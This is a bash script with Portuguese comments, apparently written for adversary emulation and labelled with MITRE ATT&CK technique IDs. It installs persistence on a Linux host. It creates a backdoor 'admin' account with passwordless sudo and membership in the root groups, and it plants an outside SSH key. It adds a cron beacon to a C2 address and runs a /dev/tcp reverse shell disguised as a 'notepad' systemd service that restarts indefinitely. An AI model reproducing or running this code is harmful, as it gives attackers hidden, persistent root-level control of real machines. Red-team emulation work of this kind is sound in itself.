#!/bin/bash
# usuario que será criado 
user="admin"
pass="LW5zZW5oYUAxMjMK"
ssh_key_pub='ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDkDXQCGgEYRaXxE3heFsJCw3FkvHo7u9gtSmH6h2OV9n1a2WmQCHn0gS/TVCd4kGQPa1vjI29FqQbWmfsgsCXP9zw3z1Lvsv8X+1HvzX75vDxyPUokcrm4z4cbw20yTmomPjedblu2XLgd94a4AOKLBoTpWXUkTGR8h+PBoky9LqUPMULP+9gJfJJqQ5OWWGyONTjW4mGpu1bv9P9+nbPuhqmXHG0IISoRzbj1AyGuS02gCnTf1y7cwjBmFhIfsdRHtlHEQ1HqqAflk/gTfp9SNx+upfSzq9gzVcj+hOd/V9ihUSkHW0aiJ+uMcCXroIs+adZ122jfdugTv+TNXt8f/YqQQiYzenhrUz6ppI9dYWWSdRlYT0Oaldr1XBmConsk00lfyNPD0QeND4LVq+MjtfLNHvOVvWFnGKLLzKpoe73fYpWYPHYzgF40PTSIL1OAlHKe7DIWMfJ5CbdZsu3Xj0RFz/3lGJzf5fwvoft/Ab64GH2HpYGa+INUhnMjy0M= carlos@NTB-Lenovo'
c2_ip="192.168.15.126"
c2_port="443"

# T1136.001 - Create Account: Local Account
create_local_user(){
    useradd $user -c "USUARIO MALDOSO"
    echo "$user:$pass" | chpasswd
    echo -e "$user \t ALL=(ALL:ALL) \t NOPASSWD:ALL" >> /etc/sudoers
}

# T1098 - Account Manipulation 
persistent_user(){
    gpasswd -a $user adm
    gpasswd -a $user root 
    gpasswd -a $user daemon
}

# T1098.004 - Account Manipulation: SSH Authorized Keys
ssh_key(){
    sudo -H -u $user bash -c "rm -rf "/home/$user/.ssh/id_rsa""
    sudo -H -u $user bash -c "rm -rf "/home/admin/.ssh/id_rsa.pub""
    sudo -H -u $user bash -c "ssh-keygen -t rsa -N '' <<<''"
    sudo -H -u $user bash -c "echo $ssh_key_pub >> /home/$user/.ssh/authorized_keys"
}

# T1053.003 - Scheduled Task/Job: Cron
cron_create_service(){
    servidor_remoto="$c2_ip"
    (crontab -l 2>/dev/null; echo "*/5 * * * * ping -c 1 $c2_ip >/dev/null 2>&1") | crontab -
}

# T1543.002 - Create or Modify System Process: Systemd Service
systemd_create_service(){ 
# Criando serviço para estabelecer a comunicação shell reversa com IP da C2
cat > /usr/bin/notepad <<EOF
#!/bin/bash
    while true; do
        sh -i >& /dev/tcp/$c2_ip/$c2_port 0>&1
        sleep 1  # Espera um pouco antes de tentar novamente em caso de falha
    done
EOF
chmod +x /usr/bin/notepad


# Adicionando como serviço no systemd e habilitando persistencia da comunicação mesmo após o restart 
cat > /etc/systemd/system/notepad.service <<EOF
[Unit]
Description=Serviço notepad
After=network.target

[Service]
Type=simple
ExecStart=/usr/bin/notepad
Restart=always
RestartSec=3

[Install]
WantedBy=multi-user.target'
EOF
    sudo systemctl daemon-reload
    sudo systemctl enable notepad.service
    sudo systemctl start notepad.service
    sudo systemctl status notepad.service
}

main(){
    create_local_user
    persistent_user
    ssh_key
    cron_create_service
    systemd_create_service
    
}
main